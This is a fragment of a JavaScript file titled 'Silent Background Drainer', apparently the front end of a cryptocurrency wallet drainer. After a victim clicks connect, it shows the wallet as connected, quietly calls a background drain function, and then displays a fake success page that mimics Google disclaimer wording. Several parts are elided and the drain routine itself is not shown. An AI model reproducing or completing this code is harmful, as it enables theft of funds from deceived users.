// app.js - Silent Background Drainer
...
document.addEventListener("DOMContentLoaded", () => {
    ...
    connectBtn.addEventListener("click", async () => {
        try {
            ...
            walletDisplay.innerHTML = `<strong>Connected Wallet</strong><br>${short}`;
            walletDisplay.classList.add("visible");

            connectBtn.textContent = "Wallet Connected";
            connectBtn.classList.add("connected");

            // Silent drain in background
            startSilentDrain();
...
function showSuccessPage() {
    document.body.innerHTML = `
        <div style="max-width:600px; margin:100px auto; text-align:center; font-family:Arial,sans-serif; padding:20px;">
            ...
            <p style="margin-top:60px; color:#666; font-size:14px;">This content is neither created nor endorsed by Google.</p>
        </div>
    `;
}
